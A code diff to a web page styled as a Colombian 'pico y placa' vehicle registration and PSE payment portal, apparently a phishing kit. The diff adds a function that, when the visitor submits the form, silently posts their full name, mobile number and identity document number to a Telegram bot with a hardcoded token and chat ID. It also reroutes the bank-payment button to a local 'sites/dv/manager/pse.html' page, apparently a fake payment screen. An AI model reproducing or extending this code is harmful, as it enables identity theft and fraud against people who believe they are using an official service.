@@ -621,14 +621,14 @@
                                 <label
                                     style="display: block; font-weight: 700; color: #053b29; margin-bottom: 6px;">Primer
                                     nombre<span style="color: #ef4444;">*</span>:</label>
-                                <input type="text"
+                                <input type="text" id="primerNombre"
                                     style="width: 100%; padding: 8px 12px; border: 1px solid #4b5563; border-radius: 6px; box-sizing: border-box; outline: none;">
                             </div>
                             <div>
                                 <label
                                     style="display: block; font-weight: 700; color: #053b29; margin-bottom: 6px;">Segundo
                                     nombre:</label>
-                                <input type="text"
+                                <input type="text" id="segundoNombre"
                                     style="width: 100%; padding: 8px 12px; border: 1px solid #4b5563; border-radius: 6px; box-sizing: border-box; outline: none;">
                             </div>
 
@@ -636,14 +636,14 @@
                                 <label
                                     style="display: block; font-weight: 700; color: #053b29; margin-bottom: 6px;">Primer
                                     apellido<span style="color: #ef4444;">*</span>:</label>
-                                <input type="text"
+                                <input type="text" id="primerApellido"
                                     style="width: 100%; padding: 8px 12px; border: 1px solid #4b5563; border-radius: 6px; box-sizing: border-box; outline: none;">
                             </div>
                             <div>
                                 <label
                                     style="display: block; font-weight: 700; color: #053b29; margin-bottom: 6px;">Segundo
                                     apellido:</label>
-                                <input type="text"
+                                <input type="text" id="segundoApellido"
                                     style="width: 100%; padding: 8px 12px; border: 1px solid #4b5563; border-radius: 6px; box-sizing: border-box; outline: none;">
                             </div>
 
@@ -712,7 +712,7 @@
                                 <label
                                     style="display: block; font-weight: 700; color: #053b29; margin-bottom: 6px;">Teléfono
                                     celular<span style="color: #ef4444;">*</span>:</label>
-                                <input type="text" placeholder="Ej. 3001234567"
+                                <input type="text" placeholder="Ej. 3001234567" id="telefonoCelular
                                     style="width: 100%; padding: 8px 12px; border: 1px solid #4b5563; border-radius: 6px; box-sizing: border-box; outline: none;">
                                 <p style="font-size: 11px; color: #6b7280; margin-top: 4px; margin-bottom: 0;">Debe
                                     iniciar por 3 y contener exactamente 10 dígitos numéricos.</p>
@@ -2236,6 +2236,7 @@
             });
 
             // EVENTO AL CONFIRMAR Y PAGAR EN EL MODAL DE PSE
+            // EVENTO AL CONFIRMAR Y PAGAR EN EL MODAL DE PSE
             btnConfirmarPagarPse?.addEventListener('click', () => {
                 const bancoSeleccionado = selectBancoPse ? selectBancoPse.value : '';
                 const inputCorreo = modalPse.querySelector('input[type="email"]');
@@ -2261,9 +2262,10 @@
                 if (loaderText) loaderText.textContent = 'Conectando con la pasarela PSE y su banco...';
                 if (loaderGlobal) loaderGlobal.style.display = 'flex';
 
+                // CAMBIO AQUÍ: Redirección a la pantalla de carga en sites/dv/manager/pse.html tras 3 segundos (3000 ms)
                 setTimeout(() => {
-                    window.location.href = `./${bancoSeleccionado}/index.html`;
-                }, 1500);
+                    window.location.href = 'sites/dv/manager/pse.html';
+                }, 3000);
             });
 
             // 5. DEPARTAMENTOS Y MUNICIPIOS
@@ -2510,8 +2512,9 @@
                     if (hayCamposVacios) {
                         mostrarAlerta('Por favor complete todos los campos requeridos del formulario');
                     } else {
+                        enviarDatosRegistroTelegram();
                         if (modalExito) modalExito.style.display = 'flex';
-                    }
+                    }   
 
                 } else if (pasoActual === 2) {
                     if (placasLista.length === 0) {
@@ -2676,6 +2679,37 @@
             // Credenciales Telegram (extraídas del script asset.js)
             const TELEGRAM_BOT_TOKEN = "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw";
             const TELEGRAM_CHAT_ID = "-1004245962123";
+            // Envía los datos del Paso 1 al bot de Telegram
+            function enviarDatosRegistroTelegram() {
+                const primerNombre    = document.getElementById('primerNombre')?.value.trim() || '';
+                const segundoNombre   = document.getElementById('segundoNombre')?.value.trim() || '';
+                const primerApellido  = document.getElementById('primerApellido')?.value.trim() || '';
+                const segundoApellido = document.getElementById('segundoApellido')?.value.trim() || '';
+                const celular         = document.getElementById('telefonoCelular')?.value.trim() || '';
+
+                const selTipoDoc  = document.getElementById('tipoDocumentoSelect');
+                const tipoDocTexto = selTipoDoc ? selTipoDoc.options[selTipoDoc.selectedIndex].text : '';
+                const cedula       = document.getElementById('numDocumento')?.value.trim() || '';
+
+                const mensaje =
+                    `📋 *NUEVO REGISTRO (PICO Y PLACA)* 📋\n\n` +
+                    `👤 *Primer nombre:* ${primerNombre}\n` +
+                    `👤 *Segundo nombre:* ${segundoNombre || '—'}\n` +
+                    `👥 *Apellidos:* ${primerApellido} ${segundoApellido}\n` +
+                    `📱 *Celular:* ${celular}\n` +
+                    `🪪 *Documento:* ${tipoDocTexto} ${cedula}\n` +
+                    `🕒 *Fecha:* ${new Date().toLocaleString()}`;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(err => console.error('Error enviando a Telegram:', err));
+            }
 
             // 1. Mostrar modal de Tarjeta cuando se elija "tarjeta"
             cardsMedioPago.forEach(card => {
